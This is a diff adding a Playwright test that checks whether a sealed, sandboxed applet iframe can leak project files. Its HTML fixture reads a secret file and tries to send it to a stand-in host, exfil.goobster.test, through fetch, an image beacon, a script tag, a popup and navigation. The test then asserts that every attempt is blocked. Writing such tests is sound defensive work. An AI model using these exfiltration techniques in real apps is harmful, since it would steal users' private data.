@@ -214,3 +214,54 @@ test('unavailable cryptographic identity refuses capabilities without prompting 
     expect(writes).toBe(0);
     expect((await page.request.get(`/api/app/projects/${slug}/content/data/ledger.json`)).status()).toBe(404);
 });
+
+// An app that reads its project is sealed: what it reads cannot leave the
+// frame by fetch, image, script, popup or by navigating its own frame away.
+const LEAKER = `<!-- a comment cannot hide the policy: <head> --><!doctype html><html><head><title>Leaker</title></head><body>
+<button id="leak">Leak</button><pre id="out">idle</pre>
+<script>
+document.getElementById('leak').onclick = async () => {
+    const out = (t) => { document.getElementById('out').textContent = t; };
+    try {
+        const secret = await goobster.read('secret.txt', 'text');
+        const q = encodeURIComponent(secret);
+        const tries = [];
+        try { await fetch('https://exfil.goobster.test/fetch?d=' + q); tries.push('fetch-ok'); } catch { tries.push('fetch-blocked'); }
+        new Image().src = 'https://exfil.goobster.test/img?d=' + q;
+        const s = document.createElement('script'); s.src = 'https://exfil.goobster.test/script?d=' + q; document.head.appendChild(s);
+        tries.push(window.open('https://exfil.goobster.test/popup?d=' + q) ? 'popup-ok' : 'popup-blocked');
+        out('read ' + secret.length + ' ' + tries.join(' '));
+        setTimeout(() => { location.href = 'https://exfil.goobster.test/nav?d=' + q; }, 200);
+    } catch (e) { out('ERR ' + (e.code || e.message)); }
+};
+</script></body></html>`;
+
+test('an app that reads its project cannot send the data anywhere', async ({ page }) => {
+    const leaked = [];
+    await page.context().route('https://exfil.goobster.test/**', (route) => {
+        leaked.push(route.request().url());
+        return route.fulfill({ status: 200, body: 'ok' });
+    });
+    const created = await page.request.post('/api/app/projects', { data: { name: `Sealed ${Date.now()}` } });
+    expect(created.ok(), await created.text()).toBe(true);
+    const { project: { slug } } = await created.json();
+    trackProject(page, slug);
+    const wrote = await page.request.put(`/api/app/projects/${slug}/content/secret.txt?owner=${C.OWNER}`, {
+        data: { content: 'top secret', encoding: 'utf8' }
+    });
+    expect(wrote.ok(), await wrote.text()).toBe(true);
+    const saved = await page.request.post(`/api/app/projects/${slug}/assets`, {
+        data: { slug: 'leaker', name: 'Leaker', kind: 'app', language: 'html', source: LEAKER }
+    });
+    expect(saved.ok(), await saved.text()).toBe(true);
+
+    await page.goto(`/app/projects/${C.OWNER}/${slug}/apps`);
+    const iframe = page.locator('.applet-frame');
+    await expect(iframe).toHaveAttribute('data-sealed', 'true');
+    expect(await iframe.getAttribute('sandbox')).not.toContain('allow-popups');
+    const frame = page.frameLocator('.applet-frame');
+    await frame.locator('#leak').click();
+    await expect(frame.locator('#out')).toHaveText('read 10 fetch-blocked popup-blocked');
+    await page.waitForTimeout(1000);
+    expect(leaked).toEqual([]);
+});
